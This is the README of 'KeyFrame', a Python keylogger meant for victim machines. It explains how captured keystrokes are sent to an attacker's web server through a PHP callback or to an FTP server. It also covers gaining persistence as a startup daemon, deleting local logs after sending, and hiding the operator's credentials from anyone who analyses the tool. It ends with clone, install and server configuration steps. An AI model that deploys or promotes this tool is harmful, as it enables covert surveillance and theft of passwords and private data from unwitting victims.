# KeyFrame  
A common method I see being used in keylogger development is to send the logs to the attackers **email address**. In order to send logs to an email address, we are required to enter our email credentials into the keylogger script that would be installed on the victim machine. What happens if/when the keylogger is discovered on the victim machine & code analysis is done? They have your email credentials.

KeyFrame is a keylogger that tackles this problem by allowing for different methods of log delivery. The methods KeyFrame offers gives you much more control over your own security by relying on the configurations of the web/FTP server. It also gives room for growth in making this tool even more secure, particularly server side. KeyFrame runs as a daemon meaning that running this keylogger on the victim machine as a startup script would give persistence.  

# **Reporting Methods**  
**CallBack URL**  
The CallBack URL reporting option uses the FormBeacon function which allows logs to be sent to a specially built php webpage that handles the creation of the logs on the server.  

**CallBack FTP**  
The CallBack FTP reporting option uses the FTPBeacon function which allows logs to be sent to an FTP server. This method creates the log file on the victim machine & sends the log file to your FTP server. Once the log has been sent, it is deleted from the victim machine.

**Callback Both**  
The CallBack Both reporting option uses both FormBeacon & FTPBeacon functions which each create a copy of the log file entitling the log file with a file ID where the file ID will be the same on each. Depending which beacon sent the log, the file ID will be appended with '-url' or '-ftp' to differentiate.

# **Set the Reporting Method**  
By default, the reporting method is set to use the CallBack URL method but can easily be changed to use FTP or Both.  
1. Open 'keyFrame.py' & scroll to the bottom of the script  
2. In the 'ReportMethodInUse' variable, enter the reporting method you want to use. The allowed methods are 'callback_url', 'callback_ftp' or 'callback_both'  
  
* The reporting methods **Delay** can also be set here. The **Delay** is 60 seconds by default which means that after keys have been pressed, it waits 60 seconds before sending the logs to your server.  

# Setting up KeyFrame
**Python dependencies**  
```
git clone https://github.com/4xx404/KeyFrame
cd KeyFrame
sudo python3 -m pip install -r requirements.txt
```
  
**Configuration**  
Before KeyFrame can be used, we must set up our CallBack URL & FTP server so KeyFrame knows how & where to send the logs  

1. **Setup CallBack URL Reporting Method**  
```
a) Upload 'callback.php' to your web server & copy the URL address to your callback php file  
    - Example: https://www.mywebserver.com/callback.php
b) In your web servers root directory, create a directory called 'logs'
    - Example: https://www.mywebserver.com/logs/
c) Open 'keyFrame.py' in a text editor & enter the callback URL address into the CallBackURL variable
```  
**CallBack URL setup is now complete**  

2. **Setup FTP CallBack Reporting Method**  
```
a) Setup an FTP Server (possible to use a webhost service if they offer FTP) & make a note of your servers host address, username & password
b) Open 'keyFrame.py' & change the FTPHost, FTPUsername & FTPPassword variables to match your FTP server credentials
```  
**CallBack FTP setup is now complete**
